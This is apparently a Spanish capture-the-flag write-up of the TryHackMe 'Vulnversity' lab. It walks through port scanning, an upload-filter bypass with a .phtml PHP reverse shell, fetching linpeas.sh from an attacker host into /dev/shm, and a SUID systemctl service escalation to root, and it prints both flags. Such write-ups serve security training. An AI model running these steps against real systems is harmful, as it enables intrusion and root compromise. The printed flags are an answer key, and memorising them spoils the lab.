# Vulnervesity – Informe Profesional de Pentesting

# ÍNDICE DINÁMICO DEL REPORTE

## 📋 Secciones Principales
* [1. Portada](#1-portada)
* [2. Resumen Ejecutivo](#2-resumen-ejecutivo)
* [3. Alcance](#3-alcance)
* [4. Metodología](#4-metodología)
* [5. Evidencias Técnicas](#5-evidencias)
* [6. Tabla de Comandos](#6-tabla-de-comandos)
* [7. MITRE ATT&CK](#7-mitre-attck)
* [8. Banderas (CTF)](#8-banderas)
* [9. Conclusiones y Recomendaciones](#9-Conclusiones-y-Recomendaciones)
* [10. Deslinde de Responsabilidad](#10-deslinde-de-responsabilidad)

## 1. Portada
---
* **Título del reto:** Vulnervesity
* **Autor:** Mtro. Mitchell Correa - Consultor en Ciberseguridad Ofensiva
* **Fecha:** 01/APR/2026
* **Plataforma:** THM
* **Nivel de confidencialidad:** RESTRINGIDO / EDUCATIVO

---

## 2. Resumen Ejecutivo
Se realizó una evaluación de seguridad integral sobre el servidor **Vulnervesity**, logrando un compromiso total del sistema (Root). La intrusión comenzó con un reconocimiento que reveló un servidor web **Apache** en el puerto **3333**. Tras una fase de enumeración de directorios, se localizó una funcionalidad de carga de archivos en `/internal/`.

Mediante técnicas de **Bypass de Upload**, se evadieron las restricciones de extensión utilizando el formato `.phtml`, lo que permitió la ejecución de una **Reverse Shell**. Una vez obtenido el acceso inicial como el usuario `www-data`, se procedió a una enumeración interna que reveló vectores críticos para la escalada de privilegios, específicamente el binario `systemctl` con permisos **SUID**. Finalmente, se abusó de este binario para ejecutar un servicio malicioso que otorgó privilegios de **root**, permitiendo la captura de las banderas de usuario y superusuario.

---

## 3. Alcance
**Activos Identificados**
* **IP Objetivo:** 10.64.xxx.xxx
* **Sistema Operativo:** Linux/Unix (TTL: 62)

**Servicios Detectados**
| Puerto | Servicio | Producto/Versión |
| :--- | :--- | :--- |
| 21/tcp | FTP | - |
| 22/tcp | SSH | - |
| 139/tcp | netbios-ssn | Samba |
| 445/tcp | microsoft-ds | Samba |
| 3128/tcp | squid-http | Squid Proxy |
| 3333/tcp | http | Apache 2.4.41 (Ubuntu) |

---

## 4. Metodología
1.  **Reconocimiento:** Identificación de host vivo y escaneo de puertos SYN.
2.  **Análisis de Vulnerabilidades:** Fingerprinting de servicios y escaneo con scripts NSE.
3.  **Enumeración Web:** Descubrimiento de directorios ocultos mediante Gobuster.
4.  **Explotación:** Bypass de filtros de subida y ejecución de Reverse Shell.
5.  **Post-Explotación:** Recolección de información del sistema y búsqueda de vectores de escalada.
6.  **Escalada de Privilegios:** Explotación de binarios SUID (`systemctl`) para obtener acceso Root.

---

## 5. Evidencias

### Evidencia 1 – Reconocimiento de Host y TTL
* **Objetivo:** Identificar la IP activa y el sistema operativo base.
* **Comandos útiles:** `ping` (inferido del TTL).
* **Qué hizo (técnico):** Se detectó el objetivo con una respuesta TTL de 62, indicando un sistema basado en Linux/Unix.
* **Persona común:** Es como identificar que el edificio al que queremos entrar es de concreto y no de madera.
* **Evidencia 1:** Reconocimiento de Host y TTL

### Evidencia 2 – Escaneo de Puertos SYN
* **Objetivo:** Descubrir servicios abiertos en el objetivo.
* **Comandos útiles:** `nmap -n -Pn -T4 -sS --open -p- --min-rate 3000 10.64.155.175`
* **Qué hizo (técnico):** Un escaneo rápido de los 65,535 puertos reveló los servicios **21, 22, 139, 445, 3128 y 3333**.
* **Persona común:** Revisar todas las puertas de una casa para ver cuáles están sin llave.
* **Evidencia 2:** Escaneo de Puertos SYN

### Evidencia 3 – Fingerprinting de Servicios
* **Objetivo:** Determinar versiones de software y configuraciones.
* **Comandos útiles:** `nmap -n -Pn -sV -sC -vv --min-rate 3000 -p21,22,139,445,3128,3333 -oA nmap/scan`
* **Qué hizo (técnico):** Se identificó **Apache 2.4.41** ejecutándose en el puerto no estándar **3333**.
* **Persona común:** Mirar a través de la cerradura para ver qué marca es la cerradura y cómo funciona.
* **Evidencia 3:** Fingerprinting de Servicios

### Evidencia 4 – Comprobación de Archivos de Salida
* **Objetivo:** Verificar la integridad de los reportes generados por Nmap.
* **Qué hizo (técnico):** Se confirmaron los archivos `.nmap`, `.xml` y `.html` para el análisis posterior de vulnerabilidades.
*  **Evidencia 4:** Comprobación de Archivos de Salida

### Evidencia 5 – Análisis de Vulnerabilidades Web (Puerto 3333)
* **Objetivo:** Evaluar la superficie de ataque del servidor web.
* **Qué hizo (técnico):** El reporte de Nmap reveló el título "Vuln University" y los métodos HTTP permitidos (GET, POST, OPTIONS, HEAD).
* **Persona común:** Leer el cartel de bienvenida de una tienda para saber qué venden.
* **Evidencia 5:** Análisis de Vulnerabilidades Web (Puerto 3333)

### Evidencia 6 – Visualización del Portal Web
* **Objetivo:** Análisis visual del sitio para identificar puntos de interacción.
* **Qué hizo (técnico):** Se accedió al portal `http://10.64.155.175:3333/`, confirmando que el sitio está funcional.
* **Evidencia 6:** Visualización del Portal Web

### Evidencia 7 – Análisis de Vulnerabilidades (Scripts NSE)
* **Objetivo:** Identificar CVEs conocidos en los servicios.
* **Comandos útiles:** `nmap --script vuln -p21,22,139,445,3128,3333 10.64.155.175`
* **Qué hizo (técnico):** El escaneo reportó intentos de negociación SMB; los scripts de vulnerabilidad confirmaron la presencia de servicios pero sin explotación directa inmediata por esta vía.
* **Evidencia 7:** Análisis de Vulnerabilidades (Scripts NSE)

### Evidencia 8 – Enumeración de Directorios con Gobuster
* **Objetivo:** Localizar rutas ocultas en el servidor web.
* **Comandos útiles:** `gobuster dir -u http://10.64.155.175:3333/ -w /usr/share/dirb/wordlists/common.txt`
* **Qué hizo (técnico):** Se descubrió el directorio `/internal/`, el cual presentaba un código de estado 301.
* **Persona común:** Probar diferentes nombres de carpetas en una dirección web hasta encontrar una que exista.
* **Evidencia 8:** – Enumeración de Directorios con Gobuster

### Evidencia 9 – Descubrimiento de Ruta Crítica (/internal/)
* **Objetivo:** Identificar funcionalidades dentro de directorios restringidos.
* **Qué hizo (técnico):** Se confirmó que la ruta `/internal/` contenía un panel de carga de archivos (Upload).
* **Persona común:** Es como si, husmeando en un edificio, encontraras una puerta trasera que no estaba en el mapa principal y que te lleva directamente a un cuarto de correo interno.
* **Evidencia 9:** Descubrimiento de Ruta Crítica `/internal/`

### Evidencia 10 – Identificación de Panel de Subida
* **Objetivo:** Validar el vector de entrada para una shell remota.
* **Qué hizo (técnico):** El panel `/internal/` permite la selección y envío de archivos al servidor.
* **Persona común:** Encontrar un buzón donde puedes dejar paquetes que el dueño de la casa abrirá.
* **Evidencia 10:** Identificación de Panel de Subida

### Evidencia 11 – Fuzzing de Directorios Internos
* **Objetivo:** Localizar el destino de los archivos subidos.
* **Comandos útiles:** `gobuster dir -u http://10.64.155.175:3333/internal/ -w /usr/share/dirb/wordlists/common.txt`
* **Qué hizo (técnico):** Se identificó el directorio `/internal/uploads/`, donde se almacenan los archivos cargados.
* **Persona común:** Es como si, husmeando en un edificio, encontraras una puerta trasera que no estaba en el mapa principal y que te lleva directamente a un cuarto de correo interno.
* **Evidencia 11:** Fuzzing de Directorios Internos

### Evidencia 12 – Análisis de Índices de Directorio
* **Objetivo:** Verificar la visibilidad de los archivos en el servidor.
* **Qué hizo (técnico):** El listado de directorios en `/internal/uploads/` permitió confirmar la presencia de archivos previos como `shell.phtml`.
* **Persona común:** Es como fabricar una llave maestra disfrazada de carta común para intentar meterla en el buzón y que te abra la puerta desde adentro.
* **Evidencia 12:** Análisis de Índices de Directorio

### Evidencia 13 – Generación de Payload (Reverse Shell)
* **Objetivo:** Crear un archivo malicioso para obtener control remoto.
* **Qué hizo (técnico):** Se utilizó una reverse shell en PHP (PentestMonkey), configurando la IP del atacante y el puerto de escucha.
* **Persona común:** Es como si el guardia de seguridad revisara tu carta, notara algo extraño en el sobre y te dijera: "No aceptamos este tipo de sobres aquí, retírese".
* **Evidencia 13:** Generación de Payload (Reverse Shell)

### Evidencia 14 – Intento de Intrusión (Extensión Bloqueada)
* **Objetivo:** Probar los filtros de seguridad del servidor.
* **Qué hizo (técnico):** Al intentar subir `university.php`, el servidor respondió con "Extension not allowed", indicando un filtrado basado en extensiones.
* **Persona común:** Intentar entrar con una identificación falsa que el guardia reconoce inmediatamente.
* **Evidencia 14:** Intento de Intrusión (Extensión Bloqueada)

### Evidencia 15 – Bypass Exitoso con Extensión .PHTML
* **Objetivo:** Evadir el filtro de subida.
* **Qué hizo (técnico):** Se cambió la extensión del archivo a `.phtml`. El servidor aceptó la subida con un mensaje de "Success".
* **Persona común:** Cambiar un poco el disfraz para que el guardia finalmente te deje pasar.
* **Evidencia 15:** Bypass Exitoso con Extensión `.PHTML`

### Evidencia 16 – Obtención de Acceso Inicial (Shell)
* **Objetivo:** Establecer comunicación bidireccional con el servidor.
* **Comandos útiles:** `nc -lvnp 5000`
* **Qué hizo (técnico):** Al ejecutar el archivo subido, se recibió una conexión en Netcat. Se procedió a estabilizar la shell con Python `pty.spawn('/bin/bash')`.
* **Evidencia 16:** – Obtención de Acceso Inicial (Shell)

### Evidencia 17 – Enumeración de Usuarios y Sistema
* **Objetivo:** Identificar el entorno y usuarios locales.
* **Comandos útiles:** `ls /home`, `pwd`
* **Qué hizo (técnico):** Se identificaron los usuarios `bill` y `ubuntu` en el sistema.
* **Evidencia 17:** Enumeración de Usuarios y Sistema

### Evidencia 18 – Captura de Bandera de Usuario (User Flag)
* **Objetivo:** Exfiltrar la primera bandera del reto.
* **Comandos útiles:** `cat /home/bill/user.txt`
* **Qué hizo (técnico):** Se leyó el archivo `user.txt` en el home del usuario Bill, obteniendo el hash.
* **Evidencia 18:** Captura de Bandera de Usuario (User Flag)

### Evidencia 19 – Transferencia de Herramientas de Enumeración
* **Objetivo:** Automatizar la búsqueda de vectores de escalada.
* **Comandos útiles:** `wget http://192.xxx.xxx.xxx:8080/linpeas.sh`
* **Qué hizo (técnico):** Se descargó `linpeas.sh` al directorio `/dev/shm` para evadir detección y se le otorgaron permisos de ejecución.
* **Evidencia 19:** Transferencia de Herramientas de Enumeración

### Evidencia 20 – Hallazgo de Vector SUID (systemctl)
* **Objetivo:** Identificar binarios con permisos elevados.
* **Comandos útiles:** `find / -perm -4000 -type f 2>/dev/null`
* **Qué hizo (técnico):** La enumeración manual y LinPeas resaltaron `/bin/systemctl` con permisos SUID, permitiendo ejecutar servicios como root.
* **Persona común:** Encontrar una llave maestra olvidada en un cajón que abre todas las puertas.
* **Evidencia 20:** Hallazgo de Vector SUID (systemctl)

### Evidencia 21 – Creación de Servicio Malicioso (Escalada)
* **Objetivo:** Obtener privilegios de Root.
* **Comandos útiles:** `systemctl enable /dev/shm/root.service`, `systemctl start root`
* **Qué hizo (técnico):** Se creó un archivo `root.service` diseñado para ejecutar una reverse shell hacia el puerto 6000 bajo el contexto de root.
* **Evidencia 21:** Creación de Servicio Malicioso (Escalada)

### Evidencia 22 – Compromiso Total (Root Shell)
* **Objetivo:** Confirmar el nivel máximo de privilegios.
* **Comandos útiles:** `rlwrap nc -lvnp 6000`, `ls`
* **Qué hizo (técnico):** Tras iniciar el servicio malicioso, se recibió una shell con privilegios de superusuario (`root`).
* **Evidencia 22:** – Compromiso Total (Root Shell)

### Evidencia 23 – Captura de Bandera de Root
* **Objetivo:** Finalizar el reto con la exfiltración del secreto final.
* **Comandos útiles:** `cat /root/root.txt`
* **Qué hizo (técnico):** Se accedió al directorio restringido `/root/` y lectura del archivo `root.txt` se leyó la bandera.
* **Evidencia 23:** – Captura de Bandera de Root

---

## 6. Tabla de comandos

| # | Comando | Descripción breve |
|---|---|---|
| 1 | `nmap -sS -p- --min-rate 3000` | Escaneo SYN de todos los puertos TCP. |
| 2 | `gobuster dir -u <URL> -w <list>` | Enumeración de directorios y archivos web. |
| 3 | `nc -lvnp 5000` | Listener para recibir la shell inicial (www-data). |
| 4 | `python -c "import pty; pty.spawn('/bin/bash')"` | Estabilización de la terminal interactiva. |
| 5 | `wget <IP>/linpeas.sh` | Transferencia de script de enumeración automática. |
| 6 | `find / -perm -4000 -type f 2>/dev/null` | Localización de binarios con bit SUID activo. |
| 7 | `systemctl enable /path/to/root.service` | Habilitación de servicio persistente malicioso. |
| 8 | `systemctl start root` | Ejecución del servicio para disparar la shell de Root. |

---

## 7. MITRE ATT&CK
| Fase | Táctica | Técnica | ID |
|---|---|---|---|
| Reconocimiento | Reconnaissance | Active Scanning | T1595 |
| Enumeración | Discovery | Network Service Scanning | T1046 |
| Acceso Inicial | Initial Access | Exploit Public-Facing Application | T1190 |
| Ejecución | Execution | Command and Scripting Interpreter | T1059 |
| Persistencia | Persistence | Create or Modify System Process | T1543 |
| PrivEsc | Privilege Escalation | Abuse Elevation Control Mechanism (SUID) | T1548 |
| Colección | Collection | Data from Local System | T1005 |

---

## 8. Banderas (CTF)
| Pregunta | Respuesta |
| :--- | :--- |
| ¿Qué puerto tiene el servidor web? | 3333 |
| ¿Cuál es el directorio de carga? | /internal/uploads/ |
| ¿User Flag? | 8bd7992fbe8a6ad22a63361004cfcedb |
| ¿Root Flag? | a58ff8579f0a9270368d33a9966c7fd5 |

---

## 9. Conclusiones y Recomendaciones
* **🔥 Crítica: Filtros de Carga Ineficientes.** La aplicación web solo valida extensiones comunes (`.php`) pero permite variantes ejecutables como `.phtml`. Se recomienda implementar una **Lista Blanca** estricta de extensiones y validar el tipo MIME real del archivo.
* **🔥 Crítica: Permisos SUID en Binarios del Sistema.** La configuración de `/bin/systemctl` con permisos SUID permite a usuarios sin privilegios crear y ejecutar servicios como root. Se debe eliminar el bit SUID de este binario.
* **⚠️ Media: Exposición de Servicios no Estándar.** El uso de puertos no convencionales no proporciona seguridad real. Se recomienda implementar un WAF para detectar ataques de fuerza bruta y escaneo.

---

## 10. Deslinde de responsabilidad
Este informe ha sido generado con fines **estrictamente educativos** dentro de un entorno controlado. El uso de estas técnicas sin autorización previa es ilegal. **El autor no se hace responsable del mal uso de la información contenida en este reporte.**